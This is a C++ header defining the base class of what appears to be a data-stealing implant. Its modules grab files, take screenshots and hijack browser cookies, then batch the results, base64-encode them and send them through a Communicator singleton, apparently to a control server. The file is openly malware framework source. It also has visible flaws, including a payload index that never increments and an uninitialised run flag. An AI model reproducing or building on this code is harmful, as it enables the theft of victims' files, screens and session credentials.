#pragma once

#include <stdio.h>
#include <iostream>
#include "../include/json.hpp"
#include "../Utils/CryptoUtils.h"
#include "../Communicator/Communicator.h"

/*

BaseModule is a pure virtual class. 
Each derived class shall call BaseModule("derived_module_class_type") c'tor,
passing its correspoing arguments. 

*/

typedef enum SupportedModules {
        FILE_GRABBER=0,
        SCREEN_SHOOTER,
        COOKIE_HIJACKER,
        NUM_OF_MODULES
    } supported_modules_enum;

using json = nlohmann::json;

#define BYTES unsigned char *
#define ARTIFACT BYTES

typedef struct 
{
    ARTIFACT artifact;
    size_t length;
} artifact_t;

class BaseModule
{
protected:
    json args;
    std::string module_type;
    std::vector<artifact_t> artifacts;
    bool run_;

    /* Derived classes with override this function */
    virtual void module_impl() = 0;

    /* upon artifact collection, the derived class shall call this method */
    void save_artifact(artifact_t artifact)
    {
        artifacts.push_back(artifact);
        if(artifacts.size() >= 10)
        {
            std::vector<artifact_t> clone;
            artifacts.swap(clone);
            send_artifacts(clone);
        }

    }

    void send_artifacts(std::vector <artifact_t> artifacts)
    {
        json payload;
        unsigned index = 0;
        for(artifact_t a : artifacts)
        {
            std::string base64_artifact = encode_artifacts(a);
            std::stringstream key;
            key << module_type << "_" << index;
            payload[key.str()] = base64_artifact;
        }
        Communicator::getInstance().send_artifact(payload);
    }

    std::string encode_artifacts(artifact_t a)
    {
        return CryptoUtils::base64_encode(a.artifact, a.length);
    }

private:
    static const char * module_names[];

public:

    static supported_modules_enum supported_module_for_name(const std::string & module_name);

    BaseModule(const BaseModule &) = delete;

    BaseModule(std::string mtype, const json & module_args) : args(module_args), module_type(mtype){
        /**/
    }

    ~BaseModule(){
        /**/
    }

    /*  
    Derived class can override this function to avoid running forever (or until stop is received) 
    This function will be considered as the main function of the module - from an outer world perspective. 
    */
   
    virtual void run()
    {
        while (run_)
        {
            module_impl();
        }
    }
    
    void stop()
    {
        run_ = false;
    }

};




